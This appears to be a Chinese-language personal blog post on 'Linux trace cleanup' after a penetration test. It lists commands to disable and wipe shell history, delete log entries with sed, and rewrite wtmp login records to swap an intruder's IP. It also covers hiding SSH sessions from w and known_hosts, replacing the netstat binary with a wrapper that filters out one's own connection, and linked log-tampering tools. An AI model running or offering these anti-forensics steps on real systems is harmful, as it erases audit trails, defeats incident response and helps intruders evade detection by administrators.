<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>0x00 Linux 痕迹清理 [ Breezy_Struggle ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});



</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Breezy_Struggle" type="application/atom+xml">
</head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel" href="https://github.com/meizjm3i/Meizj" target="_blank" rel="noopener">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Breezy's Blog</a></div><article id="post"><h1 id="postTitle">0x00 Linux 痕迹清理</h1><h2 id="Linux-痕迹清理"><a href="#Linux-痕迹清理" class="headerlink" title="Linux 痕迹清理"></a>Linux 痕迹清理</h2><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>history 命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">history 查看当前session历史命令缓冲区及历史命令文件</span><br><span class="line">高级用法</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&#39;%F %T &#39;</span><br><span class="line">history |more 可以查看到历史命令的具体时间    &#x2F;bin&#x2F;bash下测试有效</span><br><span class="line"></span><br><span class="line">CTRL+r 进入历史命令搜索模式   输入部分关键字 搜索后回车执行</span><br><span class="line"></span><br><span class="line">快速执行上一条命令</span><br><span class="line">!!</span><br><span class="line">上</span><br><span class="line">!-1(同样在查看到编号后可以!+数字执行)</span><br><span class="line">ctrl p</span><br><span class="line"></span><br><span class="line">有关变量</span><br><span class="line">HISTSIZE 指定历史记录文件的大小</span><br><span class="line">HISTFILE 指定记录历史命令的文件</span><br><span class="line"></span><br><span class="line">history -c 清除当前shell对应的所有的命令历史(直接清空文件) 需要注意不同的执行环境</span><br><span class="line">history -a 将历史命令缓冲区内容写入到文件中(多个session)</span><br><span class="line">history -w 将当前历史命令缓冲区内容写入到文件中</span><br><span class="line">history -r 清除当前历史命令缓冲区的内容</span><br></pre></td></tr></table></figure>
<p>根据上述命令，每一次session结束后会自动将命令执行，缓冲区的内容写入到历史命令记录文件中。因此可以在每次执行结束后执行<code>history -r</code>清除。也可以指定<code>export HISTFILE=为空或者置为/dev/null</code>让结束后命令历史写入的文件不存在。也可以修改<code>HISTSIZE</code>为0，禁止写入到历史记录文件中。</p>
<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</code></p>
<p>如果在日志中已经有了记录，可以在无痕状态下使用sed进行清除<code>sed  -i &#39;/content/&#39;d  file</code></p>
<h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">last-----&gt; &#x2F;var&#x2F;log&#x2F;wtmp       记录计算机重启和登入的情况</span><br><span class="line">lastlog-----&gt; &#x2F;var&#x2F;log&#x2F;lastlog 记录用户上一次登录历史</span><br><span class="line">lastb------&gt; &#x2F;var&#x2F;log&#x2F;btmp     记录登录失败历史</span><br><span class="line">w----------&gt;&#x2F;varr&#x2F;run&#x2F;utmp     w命令查看当前在线</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure 与安全相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;maillog 与邮件相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log  系统登录日志(debian系统)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~&#x2F;.bash_history  其余的tcsh、zsh、sh、ksh等</span><br><span class="line">~&#x2F;.mysql_history  mysql命令执行历史</span><br><span class="line">~&#x2F;.viminfo   记录vim 操作记录  可还原写入文件</span><br><span class="line"></span><br><span class="line">其余一些web服务的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log   ---error.log等</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">很多Java中间件或组件的日志会存在应用目录的log目录下</span><br><span class="line">如tomcat的catalina.out,activeMq的activemq.log</span><br><span class="line">更具体的路径可以相应查看log.properties或者log4j.properties以及代码中的设置</span><br></pre></td></tr></table></figure>
<p>对于文件的删除比较粗糙可以直接<code>echo &gt; file</code>清空，也可以稍微精细一点使用<code>sed</code>对文本文件进行删除。对于<code>wtmp,btmp,utmp</code>这种二进制文件可以使用<a href="https://github.com/re4lity/logtamper" target="_blank" rel="noopener">logtamper</a>(可以隐藏w连接并清除掉指定的ip登录记录，对于lastlog只能修改登录时间)，<a href="https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/tools/ssh/fake_login_log.py" target="_blank" rel="noopener">fake_login_log.py</a>可以进一步对登录信息进行隐藏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Linux可以使用如下命令将二进制文件转换为文本后操作</span><br><span class="line">utmpdump &#x2F;var&#x2F;log&#x2F;wtmp |sed &quot;s&#x2F;192.168.233.132&#x2F;1.1.1.1&#x2F;g&quot; |utmpdump -r &gt;&#x2F;tmp&#x2F;wtmp1 &amp;&amp;\mv  &#x2F;tmp&#x2F;wtmp1 &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line">Unix</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp &lt; &#x2F;var&#x2F;adm&#x2F;wtmpx | sed &quot;s&#x2F;192.168.8.88&#x2F;localhost&#x2F;g&quot; | &#x2F;usr&#x2F;lib&#x2F;acct&#x2F;fwtmp -ic &gt; &#x2F;var&#x2F;adm&#x2F;wtmpx</span><br></pre></td></tr></table></figure>
<h3 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 &#x2F;bin&#x2F;bash -i -T参数隐藏w命令查看</span><br><span class="line">ssh -o UserKnownHostsFile&#x3D;&#x2F;dev&#x2F;null -T user@host &#x2F;bin&#x2F;bash –i  不记录Linux公钥到known_hosts中</span><br><span class="line">直接查看网络连接netstat -antp| grep 22还是存在的</span><br><span class="line"></span><br><span class="line">进一步简单的隐藏可以备份bin文件替换成其他可执行sh文件写入命令过滤自己的连接</span><br><span class="line">which netstat </span><br><span class="line">cp &#x2F;path&#x2F;netstat &#x2F;path&#x2F;netstat.bak</span><br><span class="line">vi &#x2F;path&#x2F;netstat ----&gt; &#x2F;path&#x2F;netstat.bak $&#123;*&#125; &#125; |grep -v ip </span><br><span class="line">更深层次就需要进行Hook或者驱动级隐藏</span><br></pre></td></tr></table></figure>
<p>其实渗透就和下棋一样，步步为营，每走一步都需要细致的考虑会造成什么影响，在结束后进行还原，上传什么文件，不用后马上删掉。宁可慢一点检查一遍命令，也不要随意复制乱敲，导致后续需要花费更大的功夫来补救。</p>
</article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Breezy </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj" target="_blank" rel="noopener"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
$('pre').addClass('prettyprint linenums');
prettyPrint();
//- });
$(".gutter").remove();</script></body></html>